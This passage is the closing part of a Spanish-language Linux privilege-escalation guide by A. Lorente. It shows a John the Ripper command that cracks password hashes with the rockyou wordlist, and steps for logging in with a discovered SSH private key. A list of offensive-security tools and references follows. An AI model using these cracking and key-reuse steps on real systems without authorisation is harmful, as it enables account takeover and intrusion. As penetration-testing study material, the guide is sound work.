john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Si encuentras clave SSH
chmod 600 id_rsa
ssh -i id_rsa user@localhost
```

---

## üìö Referencias

### Herramientas
- [GTFOBins](https://gtfobins.github.io/) - Binarios Unix para bypass
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) - Enumeraci√≥n automatizada
- [pspy](https://github.com/DominicBreuker/pspy) - Monitor de procesos sin root
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

### Recursos
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [MITRE ATT&CK - Linux](https://attack.mitre.org/matrices/enterprise/linux/)

### Exploit Databases
- [Exploit-DB](https://www.exploit-db.com/)
- [Packet Storm](https://packetstormsecurity.com/)

---

**√öltima actualizaci√≥n**: 2025-01-10
**Autor**: A. Lorente
**Licencia**: Creative Commons BY-NC-SA 4.0
